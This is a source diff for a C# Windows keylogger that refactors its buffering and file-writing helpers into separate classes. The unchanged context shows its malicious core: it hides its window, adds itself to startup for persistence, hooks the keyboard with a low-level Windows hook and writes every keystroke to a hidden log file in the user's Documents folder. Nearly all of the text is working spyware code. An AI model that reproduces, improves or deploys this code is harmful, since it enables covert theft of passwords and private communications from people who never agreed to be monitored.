@@ -20,7 +20,6 @@ public static class Program
     private static readonly string PathToFile =
         Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "klog.txt");
 
-    private static readonly List<string> Buffer = new();
     private static readonly StreamWriter Writer = new(PathToFile, true);
     private static UnhookWindowsHookExSafeHandle? _kbHook;
     private static bool _capsLockActive;
@@ -29,14 +28,14 @@ public static class Program
     public static unsafe void Main()
     {
         HideWindow();
-        WriteInfoToLogFile();
+        LogFile.WriteInfo(PathToFile, Writer);
         AddToStartup();
 
         // write buffer on process exit
         AppDomain.CurrentDomain.ProcessExit += (_, _) =>
         {
             _kbHook?.Close();
-            WriteBuffer();
+            StringBuffer.Write(Writer);
             Writer.Dispose();
         };
 
@@ -76,7 +75,7 @@ public static class Program
         // handle keyup events as it is important with shift, alt and control
         if (wParam == KEYUP) stringToWrite = HandleKeyUp(kbStruct);
 
-        WriteToFile(stringToWrite);
+        StringBuffer.WriteToFile(stringToWrite, Writer);
 
         return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
     }
@@ -288,64 +287,6 @@ public static class Program
         if (kbStruct->vkCode == 0xA0 || kbStruct->vkCode == 0xA1) _shiftActive = false;
 
         return stringToWrite;
-    }
-
-    /// <summary>
-    ///     Adds a string to the <see cref="Buffer" /> and writes the <see cref="Buffer" /> to file if
-    ///     <see cref="BufferSize" /> has been reached.
-    /// </summary>
-    /// <param name="stringToWrite">String to add to buffer</param>
-    // needs to be an async void because can't make KeyboardCallback async, so cannot await inside of it
-    private static async void WriteToFile(string stringToWrite)
-    {
-        if (Buffer.Count >= BufferSize)
-            try
-            {
-                await WriteBufferAsync();
-            }
-            catch (InvalidOperationException e)
-            {
-                // InvalidOperationException can be thrown when the StreamWriter is currently in use, so 
-                // the code waits for 1 second before writing the buffer and copies the buffer before that so there's
-                // no new buffer that would be written twice to the file while the old one would be lost
-                var tempBuffer = Buffer;
-                await Task.Delay(1000).ContinueWith(_ => WriteBufferAsync(tempBuffer));
-                Console.WriteLine(e.Message);
-            }
-
-        Buffer.Add(stringToWrite);
-    }
-
-    /// <summary>
-    ///     Writes <see cref="Buffer"/> to <see cref="PathToFile">the log file</see> using the <see cref="Writer"/>
-    /// </summary>
-    private static void WriteBuffer()
-    {
-        foreach (var str in Buffer) Writer.Write(str);
-        Writer.Flush();
-        Buffer.Clear();
-    }
-
-    /// <summary>
-    ///     Asynchronously writes <see cref="Buffer"/> to <see cref="PathToFile">the log file</see> using the <see cref="Writer"/>
-    /// </summary>
-    private static async Task WriteBufferAsync()
-    {
-        foreach (var str in Buffer) await Writer.WriteAsync(str);
-        await Writer.FlushAsync();
-        Buffer.Clear();
-    }
-
-    /// <summary>
-    ///     Asynchronously writes passed buffer to <see cref="PathToFile">the log file</see> using the <see cref="Writer"/>
-    /// </summary>
-    /// <param name="buffer">Buffer to be written</param>
-    private static async Task WriteBufferAsync(ICollection<string> buffer)
-    {
-        foreach (var str in Buffer) await Writer.WriteAsync(str);
-        await Writer.FlushAsync();
-
-        buffer.Clear();
     }
 
     /// <summary>
